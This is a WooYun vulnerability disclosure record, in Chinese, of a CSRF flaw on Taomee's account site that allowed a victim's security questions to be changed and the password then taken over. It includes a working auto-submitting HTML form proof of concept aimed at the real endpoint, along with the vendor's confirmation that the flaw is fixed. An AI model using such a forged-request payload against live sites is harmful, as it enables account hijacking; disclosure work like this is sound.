{"id": 13453, "wybug_id": "wooyun-2013-021727", "wybug_title": "淘米网某处设计缺陷可导致修改用户密码", "wybug_corp": "淘米网", "wybug_author": "带馅儿馒头", "wybug_date": "2013-04-15 19:33", "wybug_open_date": "2013-04-16 14:48", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["应用配置错误", "利用技巧", "绕过", "类型应用", "漏洞利用", "敏感接口缺乏校验", "任意密码修改"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-16：\t厂商提前公开漏洞，细节向公众公开  简要描述： RT 详细说明：  1.注册一个用户，用户设置了密保问题后，可通过密保问题修改登录密码和支付密码；\n\n2.系统在设置密保功能处未校验referer，导致可通过csrf修改用户密保，运行以下例子POC；\n<html><body><form id=\"mantou\" name=\"mantou\" action=\"http://account.61.com/protect/setQuestions\" method=\"POST\"><input type=\"hidden\" name=\"q_key1\" value=\"1\" /><input type=\"hidden\" name=\"q_key2\" value=\"12\" /><input type=\"hidden\" name=\"q_key3\" value=\"14\" /><input type=\"hidden\" name=\"answer1\" value=\"ceshi\" /><input type=\"hidden\" name=\"answer2\" value=\"ceshi1\" /><input type=\"hidden\" name=\"answer3\" value=\"ceshi2\" /><input type=\"submit\" value=\"submit\" /></form><script>   document.mantou.submit()</script></body></html>\n3.运行POC效果截图；\n\n4.现在我们就能通过密保问题找回用户密码了；\n\n5.填入密保问题答案即可来到密码设置页面；\n\n\n\n   漏洞证明：  见详细说明   修复方案：     版权声明：转载请注明来源 带馅儿馒头@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-04-16 10:18 厂商回复： 非常感谢“带馅儿馒头”对淘米网的关注，漏洞已确认，该漏洞影响未设置过密保的米米号，我们正在联系开发人员修复漏洞，再次表示感谢！ 最新状态： 2013-04-16：漏洞已修复，再次感谢“带馅儿馒头”对淘米网的关注，谢谢！  ", "replys": "漏洞评价：\n评论\n     2013-04-16 17:04 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  真是神速。淘米网对安全问题真是很上心。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}